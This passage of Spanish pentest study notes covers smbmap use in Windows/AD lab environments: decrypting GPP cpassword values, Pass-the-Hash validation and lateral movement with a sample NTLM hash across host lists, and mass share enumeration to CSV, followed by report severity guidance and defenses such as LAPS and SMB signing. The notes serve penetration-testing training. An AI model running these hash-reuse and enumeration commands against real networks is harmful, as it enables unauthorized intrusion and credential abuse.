El valor del campo `cpassword` dentro del XML se descifra con `gpp-decrypt` (preinstalado en Kali) y devuelve la contraseña en texto claro.

---

### Flujo 4 — Movimiento lateral con Pass-the-Hash

Con un hash NTLM obtenido de mimikatz, secretsdump o hashdump de Metasploit, smbmap permite validarlo y operar sobre otros hosts de la red sin necesidad de crackear la contraseña.

**Paso 1 — Validar el hash contra el host objetivo**

> [!tip] Comprobar validez del hash NTLM y acceso administrativo
> 
> ```bash
> smbmap -H 10.10.10.150 -u 'Administrator' \
>   -p 'aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4' \
>   --admin
> ```
> 
> `--admin` — Confirmación rápida: si el output muestra `ADMIN!!!`, el hash es válido y el usuario tiene privilegios de administrador local sobre este host. Esto abre la puerta a RCE, volcado de hashes SAM y movimiento lateral en cascada.

**Paso 2 — Verificar acceso a shares administrativos**

> [!tip] Listar shares con hash NTLM validado
> 
> ```bash
> smbmap -H 10.10.10.150 -u 'Administrator' \
>   -p 'aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4'
> ```
> 
> Si `C$` aparece con `READ, WRITE`, se tiene acceso completo al sistema de ficheros del objetivo.

**Paso 3 — Escalar a múltiples hosts (local admin password reuse)**

> [!tip] Validar el mismo hash contra toda una subred
> 
> ```bash
> smbmap --host-file /opt/targets/workstations.txt \
>   -u 'Administrator' \
>   -p 'aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4' \
>   --admin --no-banner -q
> ```
> 
> `--host-file` — Lista de estaciones de trabajo. En entornos con imágenes corporativas idénticas, el hash del administrador local suele ser el mismo en todas las máquinas (local admin password reuse), permitiendo comprometer toda la flota de un solo golpe.

> [!important] Local Admin Password Reuse — Riesgo crítico Este escenario es el argumento principal para implementar LAPS (Local Administrator Password Solution) en entornos Windows. LAPS genera contraseñas aleatorias únicas por máquina para la cuenta de administrador local, rompiendo este vector. Si se detecta este patrón en un pentest, documentarlo siempre como hallazgo **Critical** independientemente de otros hallazgos del informe.

---

### Flujo 5 — Enumeración masiva y generación de informe

Para auditorías de entornos grandes donde se quiere un inventario completo de permisos SMB en toda la red.

**Paso 1 — Generar lista de hosts con SMB abierto (con nmap previo)**

```bash
nmap -p 445 --open -oG - 10.10.10.0/24 | grep '/open' | awk '{print $2}' > /opt/targets/smb-hosts.txt
```

**Paso 2 — Enumeración masiva con output a CSV**

> [!tip] Inventario masivo de shares con salida a CSV
> 
> ```bash
> smbmap --host-file /opt/targets/smb-hosts.txt \
>   -u 'jdoe' -p 'Password123!' -d 'CORP.LOCAL' \
>   --csv /opt/output/smb-audit-$(date +%F).csv \
>   --no-write-check --no-banner --no-color -q \
>   --timeout 3
> ```
> 
> `--csv` — Genera un CSV con todas las shares y permisos para importar al informe. `--no-write-check` — Acelera el escaneo masivo omitiendo la verificación de escritura. `--timeout 3` — Aumenta el timeout para evitar falsos negativos en red lenta. `-q` — Solo registra shares con acceso efectivo en el CSV.

---

## 🔗 Relaciones / Contexto

smbmap ocupa la fase de **enumeración de servicios de red** dentro de un pentest Windows o AD, complementando a `nmap` (descubrimiento de puertos) y precediendo a técnicas de explotación como SMB Relay, PtH en cascada o volcado de credenciales. En el contexto del módulo de Windows Privilege Escalation de HTB Academy, la enumeración SMB es relevante como vector de reconocimiento lateral una vez se tiene foothold en la red: los shares con `WRITE` pueden usarse para entregar payloads, y los shares con `READ` pueden revelar credenciales que permitan la escalada.

Las herramientas que trabajan en el mismo espacio son `smbclient` (interacción interactiva con shares, sin mostrar permisos), `crackmapexec` / `netexec` (enumeración masiva con más módulos y spraying), `impacket-smbclient` (exploración de shares desde Python), y `manspider` (búsqueda de contenido en shares a escala). En entornos donde el output de smbmap es insuficiente (por ejemplo, cuando SMBv1 está deshabilitado y hay problemas de compatibilidad), `netexec --shares` suele ser la alternativa más fiable.

Para el informe de pentest, los hallazgos SMB se priorizan así: shares accesibles anónimamente con datos sensibles → **Critical**; shares accesibles con credenciales de usuario estándar que contienen datos de otros departamentos o configuraciones de sistema → **High**; SMB Signing deshabilitado (habilita Relay) → **High**; shares con exceso de permisos sin datos sensibles → **Medium** o **Low**. La recomendación defensiva estándar combina auditoría periódica de permisos de shares (PingCastle, BloodHound), implementación de SMB Signing obligatorio por GPO, despliegue de LAPS, y restricción de `RestrictAnonymous = 2` para deshabilitar sesiones nulas.